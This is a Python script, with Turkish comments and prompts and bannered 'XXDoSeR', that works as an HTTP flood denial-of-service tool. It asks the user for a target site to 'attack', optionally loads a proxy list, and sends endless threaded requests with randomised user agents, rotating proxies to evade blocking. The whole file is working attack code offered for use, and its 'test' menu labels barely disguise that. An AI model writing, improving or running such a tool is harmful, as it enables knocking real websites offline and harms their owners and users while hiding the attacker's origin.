import urllib.request
import random
import time
from user_agent import generate_user_agent
from urllib.request import ProxyHandler, build_opener
from pyfiglet import Figlet
from concurrent.futures import ThreadPoolExecutor
import threading

# Renkler
F = '\033[1;32m'
Z = '\033[1;31m'
S = '\033[1;33m'
B = '\x1b[38;5;208m'

# Logo
fig = Figlet(font='slant')
print(fig.renderText('XXDoSeR'))

# Proxy listesini yükle
def load_proxies(file_path="proxies.txt"):
    try:
        with open(file_path, 'r') as file:
            proxies = [line.strip() for line in file.readlines()]
        print(f"{F}{len(proxies)} proxy yüklendi.")
        return proxies
    except FileNotFoundError:
        print(f"{Z}Proxy dosyası bulunamadı! Proxy’siz devam edilecek.")
        return []

# İstek gönder
def send_request(url, proxy=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-us,en;q=0.5',
        'Accept-Encoding': 'gzip,deflate',
        'Connection': 'keep-alive',
    }
    try:
        if proxy:
            proxy_handler = ProxyHandler({'http': proxy, 'https': proxy})
            opener = build_opener(proxy_handler)
            req = opener.open(urllib.request.Request(url, headers=headers))
        else:
            req = urllib.request.urlopen(urllib.request.Request(url, headers=headers))
        print(f"{F}Başarılı: {url} | {proxy if proxy else 'No Proxy'}")
    except Exception as e:
        print(f"{Z}Başarısız: {url} | {proxy if proxy else 'No Proxy'} | Hata: {e}")

# Proxy kullanmadan test
def attack_no_proxy(url):
    with ThreadPoolExecutor(max_workers=10) as executor:
        while True:
            executor.submit(send_request, url)

# Proxy ile test
def attack_with_proxy(url, proxies):
    with ThreadPoolExecutor(max_workers=10) as executor:
        while True:
            proxy = random.choice(proxies) if proxies else None
            executor.submit(send_request, url, proxy)

# Kullanıcıdan giriş al
def main():
    url = input(f"{B}Saldırı yapılacak site URL’yi girin: ").strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url

    proxies = load_proxies()

    choice = input(f'''
{Z}[1] Proxy kullanmadan test
{S}[2] Proxy ile test
{F}Seçiminiz: ''')

    if choice == '1':
        print(f"{S}Proxy kullanmadan saldırı başlatılıyor...")
        attack_no_proxy(url)
    elif choice == '2':
        print(f"{S}Proxy kullanarak saldırı başlatılıyor...")
        attack_with_proxy(url, proxies)
    else:
        print(f"{Z}Geçersiz seçim!")

# Programı çalıştır
if __name__ == "__main__":
    main()
